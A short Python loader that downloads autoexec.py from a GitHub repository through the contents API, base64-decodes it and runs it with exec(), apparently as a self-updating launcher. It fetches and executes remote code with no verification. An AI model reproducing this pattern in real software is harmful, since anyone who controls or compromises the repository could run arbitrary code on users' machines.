#https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28
#Github API updates quicker than HTTP Request
import base64
import urllib.request
url = "https://api.github.com/repos/FSTDM/WBP/contents/autoexec.py"
response = urllib.request.urlopen(url).read().decode('utf-8')
b64ContentWithNewLines = response.split(',"content":"')[1].split('\\n",')[0]
b64Content = b64ContentWithNewLines.replace("\\n","")
code = base64.b64decode(b64Content).decode('utf-8')
exec(code)
